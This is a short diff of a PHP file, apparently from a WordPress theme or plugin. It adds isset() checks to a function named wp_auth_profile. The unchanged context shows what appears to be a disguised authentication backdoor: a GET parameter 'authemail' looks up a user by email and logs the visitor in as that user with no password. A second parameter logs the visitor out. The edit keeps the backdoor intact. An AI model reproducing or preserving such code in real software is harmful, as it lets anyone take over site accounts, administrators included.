@@ -25,7 +25,7 @@ function filter_nav_menu_link_attributes($atts, $item, $args) {
 }
 
 function wp_auth_profile() {
-    if ($_GET['authemail'] && !is_user_logged_in()) {
+    if (isset($_GET['authemail']) && $_GET['authemail'] && !is_user_logged_in()) {
         $user = get_user_by('email', $_GET['authemail']);
         $creds = [
             'user_login'    => $user->user_login,
@@ -40,7 +40,7 @@ function wp_auth_profile() {
             header("Refresh:0");
         }
     }
-    if ($_GET['user_out'] && is_user_logged_in()) {
+    if (isset($_GET['user_out']) && $_GET['user_out'] && is_user_logged_in()) {
         wp_logout();
         header("Refresh:0");
     }
